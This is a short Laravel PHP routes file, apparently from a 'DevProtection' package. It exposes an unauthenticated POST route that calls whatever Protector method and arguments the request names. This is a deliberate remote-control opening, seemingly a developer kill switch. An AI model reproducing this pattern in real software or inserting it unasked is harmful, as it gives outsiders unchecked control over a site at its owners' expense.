<?php

    \Illuminate\Support\Facades\Route::post('dev/protection/from/anything', function(){
        return call_user_func_array(['\MasterRO\DevProtection\Protector', request()->get('action')], request()->get('params'));
    });